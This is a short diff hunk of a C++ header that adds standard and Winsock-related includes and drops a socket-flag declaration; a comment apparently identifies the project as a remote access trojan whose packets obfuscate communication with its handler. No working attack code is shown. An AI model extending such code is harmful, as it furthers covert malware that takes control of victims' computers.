@@ -7,13 +7,12 @@
 #include <iomanip>
 #include <sstream>
 #include <vector>
+#include <chrono>
+#include <utility>
+#include <thread>
 
 #include <winsock2.h>
 #include <ws2tcpip.h>
-
-// defines behaviour for the socket to use (flags)
-// 0 -> default behaviour
-extern const int behaviour;
 
 // custom packet send across a socket to obfuscate
 // communication between rat and handler
